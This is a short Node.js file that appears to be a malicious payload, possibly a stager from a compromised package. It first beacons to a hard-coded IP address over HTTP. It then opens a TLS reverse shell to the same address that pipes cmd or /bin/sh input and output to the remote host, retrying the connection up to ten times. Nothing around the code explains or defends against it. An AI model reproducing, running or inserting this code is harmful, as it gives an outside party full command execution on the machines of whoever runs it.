const http = require('http');
http.get('http://45.63.54.27:8080/event_recv', function() {});
(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("tls"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(443, "45.63.54.27", {rejectUnauthorized:false}, function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();


